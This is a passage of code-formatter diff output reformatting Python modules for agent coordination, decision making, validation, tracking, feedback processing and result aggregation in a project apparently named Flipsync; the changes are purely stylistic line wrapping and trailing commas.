     async def _handle_agent_status_update(self, event: Event) -> None:
         """
         Handle an agent status update event.
 
@@ -578,11 +615,13 @@
                 return
 
             # Update the agent's status
             await self.update_agent_status(agent_id, status)
         except Exception as e:
-            self.logger.error(f"Error handling agent status update: {str(e)}", exc_info=True)
+            self.logger.error(
+                f"Error handling agent status update: {str(e)}", exc_info=True
+            )
 
     async def _handle_agent_capability_update(self, event: Event) -> None:
         """
         Handle an agent capability update event.
 
@@ -599,18 +638,19 @@
                 self.logger.warning("Received capability update event without agent_id")
                 return
 
             # Convert capability data to objects
             capabilities = [
-                AgentCapability.from_dict(cap_data)
-                for cap_data in capabilities_data
+                AgentCapability.from_dict(cap_data) for cap_data in capabilities_data
             ]
 
             # Update the agent's capabilities
             await self.update_agent_capabilities(agent_id, capabilities)
         except Exception as e:
-            self.logger.error(f"Error handling agent capability update: {str(e)}", exc_info=True)
+            self.logger.error(
+                f"Error handling agent capability update: {str(e)}", exc_info=True
+            )
 
     async def _handle_ping_response(self, event: Event) -> None:
         """
         Handle a ping response event.
 
@@ -648,12 +688,12 @@
             notification_name="agent_registered",
             data={
                 "agent_id": agent_info.agent_id,
                 "agent_type": agent_info.agent_type.value,
                 "name": agent_info.name,
-                "capabilities": [cap.to_dict() for cap in agent_info.capabilities]
-            }
+                "capabilities": [cap.to_dict() for cap in agent_info.capabilities],
+            },
         )
 
     async def _publish_agent_unregistration_event(self, agent_info: AgentInfo) -> None:
         """
         Publish an agent unregistration event.
@@ -664,12 +704,12 @@
         await self.publisher.publish_notification(
             notification_name="agent_unregistered",
             data={
                 "agent_id": agent_info.agent_id,
                 "agent_type": agent_info.agent_type.value,
-                "name": agent_info.name
-            }
+                "name": agent_info.name,
+            },
         )
 
     async def _publish_agent_status_event(self, agent_info: AgentInfo) -> None:
         """
         Publish an agent status update event.
@@ -680,12 +720,14 @@
         await self.publisher.publish_notification(
             notification_name="agent_status_updated",
             data={
                 "agent_id": agent_info.agent_id,
                 "status": agent_info.status.value,
-                "last_seen": agent_info.last_seen.isoformat() if agent_info.last_seen else None
-            }
+                "last_seen": (
+                    agent_info.last_seen.isoformat() if agent_info.last_seen else None
+                ),
+            },
         )
 
     async def _publish_agent_capability_event(self, agent_info: AgentInfo) -> None:
         """
         Publish an agent capability update event.
@@ -695,8 +737,8 @@
         """
         await self.publisher.publish_notification(
             notification_name="agent_capabilities_updated",
             data={
                 "agent_id": agent_info.agent_id,
-                "capabilities": [cap.to_dict() for cap in agent_info.capabilities]
-            }
-        )
+                "capabilities": [cap.to_dict() for cap in agent_info.capabilities],
+            },
+        )
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/coordinator/agent_registry.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/decision/decision_maker.py	2025-06-14 20:35:30.783724+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/decision/decision_maker.py	2025-06-19 04:03:50.320008+00:00
@@ -18,15 +18,17 @@
 import logging
 import uuid
 from datetime import datetime
 from typing import Any, Dict, List, Optional, Set, Tuple, Union
 
-from fs_agt_clean.core.coordination.decision.interfaces import (
-    DecisionMaker
-)
+from fs_agt_clean.core.coordination.decision.interfaces import DecisionMaker
 from fs_agt_clean.core.coordination.decision.models import (
-    Decision, DecisionType, DecisionStatus, DecisionConfidence, DecisionError
+    Decision,
+    DecisionType,
+    DecisionStatus,
+    DecisionConfidence,
+    DecisionError,
 )
 
 
 logger = logging.getLogger(__name__)
 
@@ -55,11 +57,11 @@
 
     async def make_decision(
         self,
         context: Dict[str, Any],
         options: List[Dict[str, Any]],
-        constraints: Optional[Dict[str, Any]] = None
+        constraints: Optional[Dict[str, Any]] = None,
     ) -> Decision:
         """Make a decision based on context, options, and constraints.
 
         Args:
             context: Context in which the decision is being made
@@ -76,11 +78,11 @@
 
         # Validate inputs
         if not options:
             raise DecisionError(
                 message="No options provided for decision making",
-                error_code="NO_OPTIONS"
+                error_code="NO_OPTIONS",
             )
 
         # Apply constraints if provided
         filtered_options = options
         if constraints:
@@ -103,32 +105,38 @@
         if network_type == "cellular":
             network_efficient = True
             logger.debug("Enabling network efficiency due to cellular network")
 
         # Score options
-        scored_options = self._score_options(filtered_options, context, battery_efficient, network_efficient)
+        scored_options = self._score_options(
+            filtered_options, context, battery_efficient, network_efficient
+        )
 
         # Select the best option
         best_option = max(scored_options, key=lambda x: x[1])
         selected_option_id = best_option[0]["id"]
         selected_confidence = best_option[1]
 
         # Generate alternatives (options not selected)
         alternatives = [
-            option["id"] for option, _ in scored_options
+            option["id"]
+            for option, _ in scored_options
             if option["id"] != selected_option_id
         ]
 
         # If we're using constraints, only include alternatives that meet the constraints
         if constraints:
             alternatives = [
-                option_id for option_id in alternatives
+                option_id
+                for option_id in alternatives
                 if any(opt["id"] == option_id for opt in filtered_options)
             ]
 
         # Generate reasoning
-        reasoning = self._generate_reasoning(best_option[0], selected_confidence, context)
+        reasoning = self._generate_reasoning(
+            best_option[0], selected_confidence, context
+        )
 
         # Create the decision
         decision = Decision.create(
             decision_type=DecisionType.SELECTION,
             action=selected_option_id,
@@ -136,17 +144,19 @@
             reasoning=reasoning,
             alternatives=alternatives,
             source=self.maker_id,
             context=context,
             battery_efficient=battery_efficient,
-            network_efficient=network_efficient
+            network_efficient=network_efficient,
         )
 
         # Store the decision
         self.decisions[decision.metadata.decision_id] = decision
 
-        logger.debug(f"Made decision {decision.metadata.decision_id} with confidence {selected_confidence:.2f}")
+        logger.debug(
+            f"Made decision {decision.metadata.decision_id} with confidence {selected_confidence:.2f}"
+        )
         return decision
 
     async def get_decision(self, decision_id: str) -> Optional[Decision]:
         """Get a decision by ID.
 
@@ -157,12 +167,11 @@
             The decision, or None if not found
         """
         return self.decisions.get(decision_id)
 
     async def list_decisions(
-        self,
-        filters: Optional[Dict[str, Any]] = None
+        self, filters: Optional[Dict[str, Any]] = None
     ) -> List[Decision]:
         """List decisions matching the given filters.
 
         Args:
             filters: Optional filters to apply
@@ -180,13 +189,11 @@
                 result.append(decision)
 
         return result
 
     def _apply_constraints(
-        self,
-        options: List[Dict[str, Any]],
-        constraints: Dict[str, Any]
+        self, options: List[Dict[str, Any]], constraints: Dict[str, Any]
     ) -> List[Dict[str, Any]]:
         """Apply constraints to options.
 
         Args:
             options: Available options
@@ -206,19 +213,17 @@
 
         if not result:
             raise DecisionError(
                 message="No options meet the constraints",
                 error_code="NO_VALID_OPTIONS",
-                details={"constraints": constraints}
+                details={"constraints": constraints},
             )
 
         return result
 
     def _option_meets_constraints(
-        self,
-        option: Dict[str, Any],
-        constraints: Dict[str, Any]
+        self, option: Dict[str, Any], constraints: Dict[str, Any]
     ) -> bool:
         """Check if an option meets the constraints.
 
         Args:
             option: Option to check
@@ -235,21 +240,23 @@
                 return False
             elif key == "max_value" and option.get("value", 0) > value:
                 return False
             elif key == "allowed_values" and option.get("value") not in value:
                 return False
-            elif key == "required_tags" and not all(tag in option.get("tags", []) for tag in value):
+            elif key == "required_tags" and not all(
+                tag in option.get("tags", []) for tag in value
+            ):
                 return False
 
         return True
 
     def _score_options(
         self,
         options: List[Dict[str, Any]],
         context: Dict[str, Any],
         battery_efficient: bool,
-        network_efficient: bool
+        network_efficient: bool,
     ) -> List[Tuple[Dict[str, Any], float]]:
         """Score options based on context and constraints.
 
         Args:
             options: Available options
@@ -283,14 +290,11 @@
             result.append((option, final_score))
 
         return result
 
     def _generate_reasoning(
-        self,
-        option: Dict[str, Any],
-        confidence: float,
-        context: Dict[str, Any]
+        self, option: Dict[str, Any], confidence: float, context: Dict[str, Any]
     ) -> str:
         """Generate reasoning for a decision.
 
         Args:
             option: Selected option
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/decision/decision_maker.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/decision/decision_validator.py	2025-06-14 20:35:30.783724+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/decision/decision_validator.py	2025-06-19 04:03:50.373817+00:00
@@ -15,15 +15,17 @@
 import abc
 import asyncio
 import logging
 from typing import Any, Callable, Dict, List, Optional, Set, Tuple, Union
 
-from fs_agt_clean.core.coordination.decision.interfaces import (
-    DecisionValidator
-)
+from fs_agt_clean.core.coordination.decision.interfaces import DecisionValidator
 from fs_agt_clean.core.coordination.decision.models import (
-    Decision, DecisionType, DecisionStatus, DecisionConfidence, DecisionError
+    Decision,
+    DecisionType,
+    DecisionStatus,
+    DecisionConfidence,
+    DecisionError,
 )
 
 
 logger = logging.getLogger(__name__)
 
@@ -32,189 +34,210 @@
 ValidationRule = Callable[[Decision], Tuple[bool, Optional[str]]]
 
 
 class BaseDecisionValidator(DecisionValidator):
     """Base class for decision validators."""
-    
+
     def __init__(self, validator_id: str):
         """Initialize the decision validator.
-        
+
         Args:
             validator_id: Unique identifier for this validator
         """
         self.validator_id = validator_id
         logger.debug(f"Initialized decision validator {validator_id}")
 
 
 class RuleBasedValidator(BaseDecisionValidator):
     """Rule-based implementation of a decision validator.
-    
+
     This implementation validates decisions against a set of rules. Each rule
     is a function that takes a decision and returns a tuple of (is_valid, message).
     If is_valid is False, the message explains why the decision is invalid.
     """
-    
+
     def __init__(self, validator_id: str):
         """Initialize the rule-based validator.
-        
+
         Args:
             validator_id: Unique identifier for this validator
         """
         super().__init__(validator_id)
         self.rules: Dict[str, ValidationRule] = {}
-    
-    async def validate_decision(
-        self,
-        decision: Decision
-    ) -> Tuple[bool, List[str]]:
+
+    async def validate_decision(self, decision: Decision) -> Tuple[bool, List[str]]:
         """Validate a decision against rules and constraints.
-        
+
         Args:
             decision: The decision to validate
-            
+
         Returns:
             Tuple of (is_valid, validation_messages)
         """
         logger.debug(f"Validating decision {decision.metadata.decision_id}")
-        
+
         # If no rules, decision is valid
         if not self.rules:
             return True, []
-        
+
         # Apply all rules
         is_valid = True
         messages = []
-        
+
         for rule_name, rule_function in self.rules.items():
             rule_result, rule_message = await rule_function(decision)
-            
+
             if not rule_result:
                 is_valid = False
                 messages.append(f"{rule_name}: {rule_message}")
-        
+
         if is_valid:
             logger.debug(f"Decision {decision.metadata.decision_id} is valid")
         else:
-            logger.debug(f"Decision {decision.metadata.decision_id} is invalid: {messages}")
-        
+            logger.debug(
+                f"Decision {decision.metadata.decision_id} is invalid: {messages}"
+            )
+
         return is_valid, messages
-    
+
     async def add_validation_rule(
-        self,
-        rule_name: str,
-        rule_function: ValidationRule
+        self, rule_name: str, rule_function: ValidationRule
     ) -> bool:
         """Add a validation rule.
-        
+
         Args:
             rule_name: Name of the rule
             rule_function: Function that implements the rule
-            
+
         Returns:
             True if the rule was added, False otherwise
-            
+
         Raises:
             DecisionError: If the rule already exists
         """
         if rule_name in self.rules:
             raise DecisionError(
-                message=f"Rule {rule_name} already exists",
-                error_code="RULE_EXISTS"
-            )
-        
+                message=f"Rule {rule_name} already exists", error_code="RULE_EXISTS"
+            )
+
         self.rules[rule_name] = rule_function
         logger.debug(f"Added validation rule {rule_name}")
         return True
-    
+
     async def remove_validation_rule(self, rule_name: str) -> bool:
         """Remove a validation rule.
-        
+
         Args:
             rule_name: Name of the rule to remove
-            
+
         Returns:
             True if the rule was removed, False otherwise
         """
         if rule_name not in self.rules:
             logger.debug(f"Rule {rule_name} not found")
             return False
-        
+
         del self.rules[rule_name]
         logger.debug(f"Removed validation rule {rule_name}")
         return True
-    
+
     async def list_validation_rules(self) -> List[str]:
         """List all validation rules.
-        
+
         Returns:
             List of rule names
         """
         return list(self.rules.keys())
-    
+
     async def add_built_in_rule(self, rule_name: str, **kwargs: Any) -> bool:
         """Add a built-in validation rule.
-        
+
         Args:
             rule_name: Name of the built-in rule
             **kwargs: Parameters for the rule
-            
+
         Returns:
             True if the rule was added, False otherwise
-            
+
         Raises:
             DecisionError: If the rule already exists or is not a valid built-in rule
         """
         if rule_name == "minimum_confidence":
             min_confidence = kwargs.get("min_confidence", 0.5)
-            
-            async def minimum_confidence_rule(decision: Decision) -> Tuple[bool, Optional[str]]:
+
+            async def minimum_confidence_rule(
+                decision: Decision,
+            ) -> Tuple[bool, Optional[str]]:
                 if decision.confidence < min_confidence:
-                    return False, f"Confidence too low ({decision.confidence:.2f} < {min_confidence:.2f})"
-                return True, None
-            
-            return await self.add_validation_rule("minimum_confidence", minimum_confidence_rule)
-        
+                    return (
+                        False,
+                        f"Confidence too low ({decision.confidence:.2f} < {min_confidence:.2f})",
+                    )
+                return True, None
+
+            return await self.add_validation_rule(
+                "minimum_confidence", minimum_confidence_rule
+            )
+
         elif rule_name == "required_reasoning":
             min_length = kwargs.get("min_length", 10)
-            
-            async def required_reasoning_rule(decision: Decision) -> Tuple[bool, Optional[str]]:
+
+            async def required_reasoning_rule(
+                decision: Decision,
+            ) -> Tuple[bool, Optional[str]]:
                 if not decision.reasoning or len(decision.reasoning) < min_length:
-                    return False, f"Reasoning too short or missing (min length: {min_length})"
-                return True, None
-            
-            return await self.add_validation_rule("required_reasoning", required_reasoning_rule)
-        
+                    return (
+                        False,
+                        f"Reasoning too short or missing (min length: {min_length})",
+                    )
+                return True, None
+
+            return await self.add_validation_rule(
+                "required_reasoning", required_reasoning_rule
+            )
+
         elif rule_name == "allowed_decision_types":
             allowed_types = kwargs.get("allowed_types", set(DecisionType))
-            
-            async def allowed_decision_types_rule(decision: Decision) -> Tuple[bool, Optional[str]]:
+
+            async def allowed_decision_types_rule(
+                decision: Decision,
+            ) -> Tuple[bool, Optional[str]]:
                 if decision.decision_type not in allowed_types:
                     return False, f"Decision type {decision.decision_type} not allowed"
                 return True, None
-            
-            return await self.add_validation_rule("allowed_decision_types", allowed_decision_types_rule)
-        
+
+            return await self.add_validation_rule(
+                "allowed_decision_types", allowed_decision_types_rule
+            )
+
         elif rule_name == "battery_efficiency":
             required = kwargs.get("required", False)
-            
-            async def battery_efficiency_rule(decision: Decision) -> Tuple[bool, Optional[str]]:
+
+            async def battery_efficiency_rule(
+                decision: Decision,
+            ) -> Tuple[bool, Optional[str]]:
                 if required and not decision.battery_efficient:
                     return False, "Battery efficiency required but not provided"
                 return True, None
-            
-            return await self.add_validation_rule("battery_efficiency", battery_efficiency_rule)
-        
+
+            return await self.add_validation_rule(
+                "battery_efficiency", battery_efficiency_rule
+            )
+
         elif rule_name == "network_efficiency":
             required = kwargs.get("required", False)
-            
-            async def network_efficiency_rule(decision: Decision) -> Tuple[bool, Optional[str]]:
+
+            async def network_efficiency_rule(
+                decision: Decision,
+            ) -> Tuple[bool, Optional[str]]:
                 if required and not decision.network_efficient:
                     return False, "Network efficiency required but not provided"
                 return True, None
-            
-            return await self.add_validation_rule("network_efficiency", network_efficiency_rule)
-        
+
+            return await self.add_validation_rule(
+                "network_efficiency", network_efficiency_rule
+            )
+
         else:
             raise DecisionError(
-                message=f"Unknown built-in rule: {rule_name}",
-                error_code="UNKNOWN_RULE"
-            )
+                message=f"Unknown built-in rule: {rule_name}", error_code="UNKNOWN_RULE"
+            )
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/decision/decision_validator.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/decision/decision_tracker.py	2025-06-14 20:35:30.783724+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/decision/decision_tracker.py	2025-06-19 04:03:50.428060+00:00
@@ -17,18 +17,21 @@
 import copy
 import logging
 from datetime import datetime
 from typing import Any, Dict, List, Optional, Set, Tuple, Union
 
-from fs_agt_clean.core.coordination.decision.interfaces import (
-    DecisionTracker
-)
+from fs_agt_clean.core.coordination.decision.interfaces import DecisionTracker
 from fs_agt_clean.core.coordination.decision.models import (
-    Decision, DecisionType, DecisionStatus, DecisionConfidence, DecisionError
+    Decision,
+    DecisionType,
+    DecisionStatus,
+    DecisionConfidence,
+    DecisionError,
 )
 from fs_agt_clean.core.coordination.event_system import (
-    EventPublisher, NotificationEvent
+    EventPublisher,
+    NotificationEvent,
 )
 
 
 logger = logging.getLogger(__name__)
 
@@ -69,18 +72,15 @@
         self.offline_decisions: List[Decision] = []
         self.metrics: Dict[str, Any] = {
             "total_decisions": 0,
             "decisions_by_status": {},
             "decisions_by_type": {},
-            "average_confidence": 0.0
+            "average_confidence": 0.0,
         }
 
     async def track_decision(
-        self,
-        decision: Decision,
-        publish_event: bool = False,
-        offline: bool = False
+        self, decision: Decision, publish_event: bool = False, offline: bool = False
     ) -> bool:
         """Track a decision.
 
         Args:
             decision: The decision to track
@@ -100,13 +100,17 @@
         self._update_metrics_for_decision(decision)
 
         # If offline, add to offline decisions
         if offline:
             # Store the decision ID in the offline_decisions list
-            if decision.metadata.decision_id not in [d.metadata.decision_id for d in self.offline_decisions]:
+            if decision.metadata.decision_id not in [
+                d.metadata.decision_id for d in self.offline_decisions
+            ]:
                 self.offline_decisions.append(decision)
-                logger.debug(f"Added decision {decision.metadata.decision_id} to offline queue")
+                logger.debug(
+                    f"Added decision {decision.metadata.decision_id} to offline queue"
+                )
         # Otherwise, publish event if requested
         elif publish_event:
             try:
                 await self.publisher.publish_notification(
                     notification_name="decision_tracked",
@@ -115,24 +119,23 @@
                         "decision_type": decision.decision_type.value,
                         "action": decision.action,
                         "confidence": decision.confidence,
                         "status": decision.metadata.status.value,
                         "decision_source": decision.metadata.source,
-                        "timestamp": datetime.now().isoformat()
-                    }
-                )
-                logger.debug(f"Published decision_tracked event for {decision.metadata.decision_id}")
+                        "timestamp": datetime.now().isoformat(),
+                    },
+                )
+                logger.debug(
+                    f"Published decision_tracked event for {decision.metadata.decision_id}"
+                )
             except Exception as e:
                 logger.error(f"Error publishing decision_tracked event: {e}")
 
         return True
 
     async def update_decision_status(
-        self,
-        decision_id: str,
-        status: DecisionStatus,
-        publish_event: bool = False
+        self, decision_id: str, status: DecisionStatus, publish_event: bool = False
     ) -> bool:
         """Update the status of a decision.
 
         Args:
             decision_id: ID of the decision to update
@@ -172,23 +175,22 @@
                     notification_name="decision_status_updated",
                     data={
                         "decision_id": decision_id,
                         "status": status.value,
                         "previous_status": old_status.value,
-                        "timestamp": datetime.now().isoformat()
-                    }
-                )
-                logger.debug(f"Published decision_status_updated event for {decision_id}")
+                        "timestamp": datetime.now().isoformat(),
+                    },
+                )
+                logger.debug(
+                    f"Published decision_status_updated event for {decision_id}"
+                )
             except Exception as e:
                 logger.error(f"Error publishing decision_status_updated event: {e}")
 
         return True
 
-    async def get_decision(
-        self,
-        decision_id: str
-    ) -> Optional[Decision]:
+    async def get_decision(self, decision_id: str) -> Optional[Decision]:
         """Get a decision by ID.
 
         Args:
             decision_id: ID of the decision to get
 
@@ -200,11 +202,11 @@
         return self.decisions.get(decision_id)
 
     async def get_decision_history(
         self,
         decision_id: Optional[str] = None,
-        filters: Optional[Dict[str, Any]] = None
+        filters: Optional[Dict[str, Any]] = None,
     ) -> List[Decision]:
         """Get the history of decisions.
 
         Args:
             decision_id: Optional ID of a specific decision
@@ -222,20 +224,20 @@
             return []
 
         # If filters are provided, apply them
         if filters:
             return [
-                decision for decision in self.decision_history
+                decision
+                for decision in self.decision_history
                 if self._matches_filters(decision, filters)
             ]
 
         # Otherwise, return all decisions
         return self.decision_history
 
     async def get_decision_metrics(
-        self,
-        filters: Optional[Dict[str, Any]] = None
+        self, filters: Optional[Dict[str, Any]] = None
     ) -> Dict[str, Any]:
         """Get metrics on decisions.
 
         Args:
             filters: Optional filters to apply
@@ -249,20 +251,21 @@
         if not filters:
             return copy.deepcopy(self.metrics)
 
         # Otherwise, calculate metrics for filtered decisions
         filtered_decisions = [
-            decision for decision in self.decision_history
+            decision
+            for decision in self.decision_history
             if self._matches_filters(decision, filters)
         ]
 
         # Calculate metrics
         metrics = {
             "total_decisions": len(filtered_decisions),
             "decisions_by_status": {},
             "decisions_by_type": {},
-            "average_confidence": 0.0
+            "average_confidence": 0.0,
         }
 
         # Calculate status and type counts
         for decision in filtered_decisions:
             status = decision.metadata.status.value
@@ -275,11 +278,13 @@
                 metrics["decisions_by_type"][decision_type] = 0
             metrics["decisions_by_type"][decision_type] += 1
 
         # Calculate average confidence
         if filtered_decisions:
-            total_confidence = sum(decision.confidence for decision in filtered_decisions)
+            total_confidence = sum(
+                decision.confidence for decision in filtered_decisions
+            )
             metrics["average_confidence"] = total_confidence / len(filtered_decisions)
 
         return metrics
 
     async def sync_offline_decisions(self) -> int:
@@ -302,12 +307,12 @@
                         "decision_type": decision.decision_type.value,
                         "action": decision.action,
                         "confidence": decision.confidence,
                         "status": decision.metadata.status.value,
                         "decision_source": decision.metadata.source,
-                        "timestamp": datetime.now().isoformat()
-                    }
+                        "timestamp": datetime.now().isoformat(),
+                    },
                 )
                 count += 1
                 logger.debug(f"Synced offline decision {decision.metadata.decision_id}")
             except Exception as e:
                 logger.error(f"Error syncing offline decision: {e}")
@@ -337,13 +342,17 @@
         if decision_type not in self.metrics["decisions_by_type"]:
             self.metrics["decisions_by_type"][decision_type] = 0
         self.metrics["decisions_by_type"][decision_type] += 1
 
         # Update average confidence
-        total_confidence = self.metrics["average_confidence"] * (self.metrics["total_decisions"] - 1)
+        total_confidence = self.metrics["average_confidence"] * (
+            self.metrics["total_decisions"] - 1
+        )
         total_confidence += decision.confidence
-        self.metrics["average_confidence"] = total_confidence / self.metrics["total_decisions"]
+        self.metrics["average_confidence"] = (
+            total_confidence / self.metrics["total_decisions"]
+        )
 
     def _matches_filters(self, decision: Decision, filters: Dict[str, Any]) -> bool:
         """Check if a decision matches the given filters.
 
         Args:
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/decision/decision_tracker.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/decision/feedback_processor.py	2025-06-14 20:35:30.783724+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/decision/feedback_processor.py	2025-06-19 04:03:50.449114+00:00
@@ -19,18 +19,21 @@
 import logging
 import uuid
 from datetime import datetime
 from typing import Any, Dict, List, Optional, Set, Tuple, Union
 
-from fs_agt_clean.core.coordination.decision.interfaces import (
-    FeedbackProcessor
-)
+from fs_agt_clean.core.coordination.decision.interfaces import FeedbackProcessor
 from fs_agt_clean.core.coordination.decision.models import (
-    Decision, DecisionType, DecisionStatus, DecisionConfidence, DecisionError
+    Decision,
+    DecisionType,
+    DecisionStatus,
+    DecisionConfidence,
+    DecisionError,
 )
 from fs_agt_clean.core.coordination.event_system import (
-    EventPublisher, NotificationEvent
+    EventPublisher,
+    NotificationEvent,
 )
 
 
 logger = logging.getLogger(__name__)
 
@@ -73,11 +76,11 @@
     async def process_feedback(
         self,
         decision_id: str,
         feedback_data: Dict[str, Any],
         publish_event: bool = False,
-        offline: bool = False
+        offline: bool = False,
     ) -> Tuple[bool, str]:
         """Process feedback on a decision.
 
         Args:
             decision_id: ID of the decision
@@ -96,11 +99,11 @@
         # Create feedback entry
         feedback_entry = {
             "feedback_id": feedback_id,
             "decision_id": decision_id,
             "feedback_data": feedback_data,
-            "timestamp": datetime.now().isoformat()
+            "timestamp": datetime.now().isoformat(),
         }
 
         # Store the feedback
         self.feedback[feedback_id] = feedback_entry
 
@@ -120,12 +123,12 @@
                     notification_name="feedback_processed",
                     data={
                         "feedback_id": feedback_id,
                         "decision_id": decision_id,
                         "feedback_summary": self._summarize_feedback(feedback_data),
-                        "timestamp": datetime.now().isoformat()
-                    }
+                        "timestamp": datetime.now().isoformat(),
+                    },
                 )
                 logger.debug(f"Published feedback_processed event for {feedback_id}")
             except Exception as e:
                 logger.error(f"Error publishing feedback_processed event: {e}")
 
@@ -143,11 +146,11 @@
         return self.feedback.get(feedback_id)
 
     async def list_feedback(
         self,
         decision_id: Optional[str] = None,
-        filters: Optional[Dict[str, Any]] = None
+        filters: Optional[Dict[str, Any]] = None,
     ) -> List[Dict[str, Any]]:
         """List feedback matching the given filters.
 
         Args:
             decision_id: Optional ID of a specific decision
@@ -166,22 +169,18 @@
             feedback_ids = self.feedback_by_decision[decision_id]
             result = [self.feedback[fid] for fid in feedback_ids]
 
             # Apply filters if provided
             if filters:
-                result = [
-                    f for f in result
-                    if self._matches_filters(f, filters)
-                ]
+                result = [f for f in result if self._matches_filters(f, filters)]
 
             return result
 
         # If filters are provided, apply them to all feedback
         if filters:
             return [
-                f for f in self.feedback.values()
-                if self._matches_filters(f, filters)
+                f for f in self.feedback.values() if self._matches_filters(f, filters)
             ]
 
         # Otherwise, return all feedback
         return list(self.feedback.values())
 
@@ -194,11 +193,13 @@
             Number of feedback entries synchronized
         """
         logger.debug(f"Syncing {len(self.offline_feedback)} offline feedback entries")
 
         count = 0
-        offline_ids = list(self.offline_feedback)  # Create a copy to avoid modification during iteration
+        offline_ids = list(
+            self.offline_feedback
+        )  # Create a copy to avoid modification during iteration
 
         for feedback_id in offline_ids:
             if feedback_id not in self.feedback:
                 self.offline_feedback.remove(feedback_id)
                 continue
@@ -209,13 +210,15 @@
                 await self.publisher.publish_notification(
                     notification_name="feedback_processed",
                     data={
                         "feedback_id": feedback_id,
                         "decision_id": feedback["decision_id"],
-                        "feedback_summary": self._summarize_feedback(feedback["feedback_data"]),
-                        "timestamp": datetime.now().isoformat()
-                    }
+                        "feedback_summary": self._summarize_feedback(
+                            feedback["feedback_data"]
+                        ),
+                        "timestamp": datetime.now().isoformat(),
+                    },
                 )
                 count += 1
                 self.offline_feedback.remove(feedback_id)
                 logger.debug(f"Synced offline feedback {feedback_id}")
             except Exception as e:
@@ -253,11 +256,13 @@
         if "network_efficient" in feedback_data:
             summary["network_efficient"] = feedback_data["network_efficient"]
 
         return summary
 
-    def _matches_filters(self, feedback: Dict[str, Any], filters: Dict[str, Any]) -> bool:
+    def _matches_filters(
+        self, feedback: Dict[str, Any], filters: Dict[str, Any]
+    ) -> bool:
         """Check if feedback matches the given filters.
 
         Args:
             feedback: Feedback to check
             filters: Filters to apply
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/decision/feedback_processor.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/coordinator/result_aggregator.py	2025-06-14 20:35:30.783724+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/coordinator/result_aggregator.py	2025-06-19 04:03:50.502672+00:00
@@ -13,25 +13,38 @@
 from datetime import datetime, timedelta
 from typing import Any, Dict, List, Optional, Set, Tuple, Type, Union, Callable
 
 from fs_agt_clean.core.monitoring import get_logger
 from fs_agt_clean.core.coordination.event_system import (
-    Event, EventType, EventPriority, create_publisher, create_subscriber,
-    EventTypeFilter, EventNameFilter, CompositeFilter
+    Event,
+    EventType,
+    EventPriority,
+    create_publisher,
+    create_subscriber,
+    EventTypeFilter,
+    EventNameFilter,
+    CompositeFilter,
 )
 from fs_agt_clean.core.coordination.coordinator.coordinator import (
-    AgentInfo, AgentStatus, AgentType, AgentCapability, CoordinationError
+    AgentInfo,
+    AgentStatus,
+    AgentType,
+    AgentCapability,
+    CoordinationError,
 )
 from fs_agt_clean.core.coordination.coordinator.task_delegator import (
-    Task, TaskStatus, TaskPriority
+    Task,
+    TaskStatus,
+    TaskPriority,
 )
 
 
 class AggregationStrategy(enum.Enum):
     """
     Strategy for aggregating results from multiple sources.
     """
+
     COLLECT = "collect"  # Simply collect all results
     MAJORITY = "majority"  # Use the majority result
     WEIGHTED = "weighted"  # Weight results by source
     FIRST = "first"  # Use the first result
     LAST = "last"  # Use the last result
@@ -39,252 +52,253 @@
 
 
 class ResultAggregator:
     """
     Component for aggregating results from multiple agents.
-    
+
     The ResultAggregator manages result collection, validation, and aggregation.
     It provides methods for collecting results from multiple agents and
     aggregating them into a single result.
     """
-    
+
     def __init__(self, aggregator_id: str):
         """
         Initialize the result aggregator.
-        
+
         Args:
             aggregator_id: Unique identifier for this aggregator
         """
         self.aggregator_id = aggregator_id
         self.logger = get_logger(f"coordinator.aggregator.{aggregator_id}")
-        
+
         # Create publisher and subscriber for event-based communication
-        self.publisher = create_publisher(source_id=f"coordinator.aggregator.{aggregator_id}")
-        self.subscriber = create_subscriber(subscriber_id=f"coordinator.aggregator.{aggregator_id}")
-        
+        self.publisher = create_publisher(
+            source_id=f"coordinator.aggregator.{aggregator_id}"
+        )
+        self.subscriber = create_subscriber(
+            subscriber_id=f"coordinator.aggregator.{aggregator_id}"
+        )
+
         # Initialize result registry
         # Maps task IDs to lists of results
         self.results: Dict[str, List[Dict[str, Any]]] = {}
-        
+
         # Initialize aggregation strategies
         # Maps task IDs to aggregation strategies
         self.strategies: Dict[str, AggregationStrategy] = {}
-        
+
         # Initialize custom aggregation functions
         # Maps task IDs to custom aggregation functions
         self.custom_aggregators: Dict[str, Callable] = {}
-        
+
         # Initialize locks for thread safety
         self.result_lock = asyncio.Lock()
-        
+
         # Initialize subscription IDs
         self.subscription_ids: List[str] = []
-    
+
     async def start(self) -> None:
         """
         Start the result aggregator.
-        
+
         This method subscribes to result events.
         """
         # Subscribe to result events
         await self._subscribe_to_events()
-        
+
         self.logger.info(f"Result aggregator started: {self.aggregator_id}")
-    
+
     async def stop(self) -> None:
         """
         Stop the result aggregator.
-        
+
         This method unsubscribes from result events.
         """
         # Unsubscribe from result events
         for subscription_id in self.subscription_ids:
             await self.subscriber.unsubscribe(subscription_id)
-        
+
         self.subscription_ids = []
-        
+
         self.logger.info(f"Result aggregator stopped: {self.aggregator_id}")
-    
+
     async def register_task(
         self,
         task_id: str,
         strategy: AggregationStrategy = AggregationStrategy.COLLECT,
-        custom_aggregator: Optional[Callable] = None
+        custom_aggregator: Optional[Callable] = None,
     ) -> bool:
         """
         Register a task for result aggregation.
-        
+
         Args:
             task_id: ID of the task
             strategy: Aggregation strategy to use
             custom_aggregator: Custom aggregation function, if strategy is CUSTOM
-            
+
         Returns:
             True if registration was successful
-            
+
         Raises:
             CoordinationError: If registration fails
         """
         try:
             async with self.result_lock:
